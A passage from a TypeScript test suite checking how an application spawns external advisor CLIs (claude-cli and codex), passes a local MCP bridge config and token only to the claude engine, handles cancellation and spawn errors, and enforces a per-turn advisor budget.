    expect(procs[0]?.stdin.listenerCount("error")).toBeGreaterThan(0);
  });

  it("an already-set Stop flag kills in the watcher's FIRST look, not one poll interval later", async () => {
    // Rust's watcher thread tests the flag before its first sleep, so a turn
    // the user had already stopped never gets a 100ms head start.
    let spawnedAt = 0;
    let killedAt = 0;
    const procs: FakeProcess[] = [];
    const spawnFn: AdvisorSpawnFn = () => {
      const proc = new FakeProcess();
      procs.push(proc);
      const realKill = proc.kill.bind(proc);
      proc.kill = (signal?: NodeJS.Signals): boolean => {
        if (killedAt === 0) killedAt = Date.now();
        return realKill(signal);
      };
      spawnedAt = Date.now();
      return proc;
    };
    await expect(
      runExternalCli("claude-cli", [userMsg("hi")], { spawnFn, cancel: { load: () => true } })
    ).rejects.toThrow();
    expect(killedAt).toBeGreaterThan(0);
    // The poll interval is 100ms; the first look is in the spawn's own tick.
    expect(killedAt - spawnedAt).toBeLessThan(90);
    // The same signal `run_external`'s `kill <pid>` sends.
    expect(procs[0]?.killSignal).toBe("SIGTERM");
  });

  it("never checks a cancel flag that was not supplied", async () => {
    const { spawnFn } = recordingSpawner(OK);
    await expect(runExternalCli("claude-cli", [userMsg("hi")], { spawnFn })).resolves.toEqual({
      text: "ok",
      usage: { inputTokens: null, outputTokens: null },
    });
  });
});

// ============================================================================
// 2c. adaptMcpBridge against a REAL, listening bridge
// ============================================================================

describe("adaptMcpBridge", () => {
  const live: McpBridge[] = [];
  afterEach(async () => {
    await Promise.all(live.splice(0).map((b) => b.stop()));
  });

  const dispatcher: ToolDispatcher = {
    listTools: () => [] as ToolSpec[],
    callTool: () => Promise.resolve({ isError: false, content: [] } as ToolCallResult),
  };

  it("wraps a real, listening McpBridge into exactly Bridge::mcp_config_json's shape", async () => {
    const scope: ToolScope = { kind: "LocalEngine" };
    const bridge = new McpBridge({ token: "tok-123", scope, dispatcher });
    await bridge.listen();
    live.push(bridge);

    const advisorBridge = adaptMcpBridge(bridge, "tok-123");
    expect(advisorBridge.token).toBe("tok-123");
    expect(advisorBridge.mcpUrl()).toBe(bridge.url);
    expect(advisorBridge.mcpUrl()).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/mcp$/);

    expect(JSON.parse(advisorBridge.mcpConfigJson())).toEqual({
      mcpServers: {
        room: { type: "http", url: bridge.url, headers: { Authorization: "Bearer tok-123" } },
      },
    });
  });
});

// ============================================================================
// 3. The execTool.ts wiring
// ============================================================================

describe("withRealAdvisorCli", () => {
  it("fills an absent seam with exactly the real externalAdvisor.ts implementation", () => {
    const deps: ExecToolDeps = { db: null, routes: [] };
    const wired = withRealAdvisorCli(deps);
    expect(wired.runAdvisorCli).toBe(realRunAdvisorCli);
    // Additive: every other field passes through unchanged.
    expect(wired.db).toBe(deps.db);
    expect(wired.routes).toBe(deps.routes);
  });

  it("never overrides a caller-supplied seam", () => {
    const mine = async (): Promise<string> => "mine";
    const deps: ExecToolDeps = { db: null, routes: [], runAdvisorCli: mine };
    expect(withRealAdvisorCli(deps).runAdvisorCli).toBe(mine);
    expect(withRealAdvisorCli(deps, { privacyBypass: true }).runAdvisorCli).toBe(mine);
  });

  it("says WHICH gap is open — the seam is uninstalled, not unported", async () => {
    // The refusal text is what a future migration batch acts on. Naming the
    // subprocess as the missing piece would send it to re-port `run_external`,
    // which `externalAdvisor.ts` already did.
    const outcome = await execTool("consult_advisor", { question: "q" }, createToolEffects(), {
      db: null,
      routes: [],
    });
    const reason = outcome.ok ? "" : outcome.error;
    expect(reason).toContain("withRealAdvisorCli");
    expect(reason).not.toMatch(/only the subprocess is missing/);
  });

  /**
   * agent.rs line 4642: `let bridge = if engine == "claude-cli" {
   * advisor_bridge } else { None };` — "the per-ask advisor bridge … is
   * claude-only; codex gets a plain pipe". `runExternalCli` supports the
   * bridge on both engines because `jobs/workflow.rs` needs it there, so the
   * restriction has to be applied HERE, per call, rather than by binding the
   * options once before the engine is known.
   */
  describe("the bridge is claude-only, exactly as the Rust arm decides it", () => {
    const bridge: AdvisorBridge = {
      mcpConfigJson: () => JSON.stringify({ mcpServers: { room: { type: "http", url: "http://127.0.0.1:9/mcp" } } }),
      mcpUrl: () => "http://127.0.0.1:9/mcp",
      token: "s3cret-token",
    };

    it("hands a CLAUDE advisor the room bridge", async () => {
      const { spawnFn, calls } = recordingSpawner(JSON.stringify({ type: "result", result: "ok" }));
      const outcome = await execTool(
        "consult_advisor",
        { question: "q" },
        createToolEffects(),
        withRealAdvisorCli({ db: null, routes: [] }, { spawnFn, bridge })
      );
      expect(outcome.ok).toBe(true);
      expect(calls[0]?.args[1]).toContain("--mcp-config");
      expect(calls[0]?.args[1]).toContain("--allowedTools 'mcp__room__*'");
      // …and it is TOLD the room's tools exist.
      expect(calls[0]?.stdin).toContain('MCP server named "room"');
    });

    it("gives a CODEX advisor a plain pipe — no room tools, no bearer token", async () => {
      const { spawnFn, calls } = recordingSpawner(
        '{"type":"item.completed","item":{"type":"agent_message","text":"ok"}}\n'
      );
      const outcome = await execTool(
        "consult_advisor",
        { question: "q", advisor: "codex" },
        createToolEffects(),
        withRealAdvisorCli({ db: null, routes: [] }, { spawnFn, bridge })
      );
      expect(outcome).toEqual({ ok: true, text: "Advisor (codex) replied:\n\nok" });
      // Binding the options before the engine was known is how a codex advisor
      // would have quietly acquired the room's file tools.
      expect(calls[0]?.args[1]).not.toContain("mcp_servers.room");
      expect(calls[0]?.env.PR_ROOM_MCP_TOKEN).toBeUndefined();
      // And the prompt does not claim a bridge the CLI has no way to reach.
      expect(calls[0]?.stdin).not.toContain('MCP server named "room"');
      expect(calls[0]?.args[1]).toContain("codex exec --json");
    });

    it("leaves every OTHER option in place for the codex path", async () => {
      // Only the bridge is engine-conditional; the cancel flag, the privacy
      // thunk and the test seams must survive into both branches.
      const { spawnFn, calls } = recordingSpawner(
        '{"type":"item.completed","item":{"type":"agent_message","text":"ok"}}\n'
      );
      await execTool(
        "consult_advisor",
        { question: "Ben asked", advisor: "codex" },
        createToolEffects(),
        withRealAdvisorCli(
          { db: null, routes: [] },
          { spawnFn, bridge, env: { ...process.env, ADVISOR_MARKER: "kept" } }
        )
      );
      expect(calls[0]?.env.ADVISOR_MARKER).toBe("kept");
    });
  });

  it("turns consult_advisor's NOT_IMPLEMENTED refusal into a real answer — the one behavior this wiring exists to change", async () => {
    const bare: ExecToolDeps = { db: null, routes: [] };
    const before = await execTool("consult_advisor", { question: "q" }, createToolEffects(), bare);
    expect(before.ok).toBe(false);
    expect(before.ok ? "" : before.error).toContain("NOT_IMPLEMENTED");

    // Wired to the REAL runExternalCli, over an injected fake process — the
    // whole path execTool -> runAdvisorCli -> runExternalCli -> parser and back.
    const { spawnFn } = recordingSpawner(JSON.stringify({ type: "result", result: "do the thing" }));
    const after = await execTool(
      "consult_advisor",
      { question: "  what now?  " },
      createToolEffects(),
      withRealAdvisorCli(bare, { spawnFn })
    );
    expect(after).toEqual({ ok: true, text: "Advisor (claude) replied:\n\ndo the thing" });
  });

  it("routes the codex advisor to the codex CLI and its JSONL parser, through the real dispatch", async () => {
    const { spawnFn, calls } = recordingSpawner(
      '{"type":"item.completed","item":{"type":"agent_message","text":"codex says hi"}}\n'
    );
    const outcome = await execTool(
      "consult_advisor",
      { question: "what now?", advisor: "codex" },
      createToolEffects(),
      withRealAdvisorCli({ db: null, routes: [] }, { spawnFn })
    );
    expect(outcome).toEqual({ ok: true, text: "Advisor (codex) replied:\n\ncodex says hi" });
    expect(calls[0]?.args[1]).toContain("codex exec --json");
    expect(calls[0]?.args[1]).toContain(CODEX_ARCELLE_FLAGS);
  });

  it("a real spawn failure comes back as execTool's own recoverable sentence, not a thrown exception", async () => {
    const spawnFn: AdvisorSpawnFn = () => {
      const proc = new FakeProcess();
      queueMicrotask(() => {
        proc.emit("error", new Error("ENOENT"));
        proc.emit("close", -2, null);
      });
      return proc;
    };
    const outcome = await execTool(
      "consult_advisor",
      { question: "q" },
      createToolEffects(),
      withRealAdvisorCli({ db: null, routes: [] }, { spawnFn })
    );
    expect(outcome.ok).toBe(true);
    expect(outcome.ok ? outcome.text : "").toContain(
      "The advisor could not be reached (Could not start claude-cli: ENOENT)"
    );
  });

  it("still spends, and still enforces, the per-turn advisor budget behind the real wiring", async () => {
    const { spawnFn } = recordingSpawner(JSON.stringify({ type: "result", result: "first answer" }));
    const effects = createToolEffects();
    const deps = withRealAdvisorCli({ db: null, routes: [] }, { spawnFn });
    const first = await execTool("consult_advisor", { question: "q" }, effects, deps);
    expect(first).toEqual({ ok: true, text: "Advisor (claude) replied:\n\nfirst answer" });
    expect(effects.advisorCalls).toBe(1);

    const second = await execTool("consult_advisor", { question: "q" }, effects, deps);
    expect(second.ok).toBe(true);
    expect(second.ok ? second.text : "").toContain("already consulted an advisor this turn");
  });
});
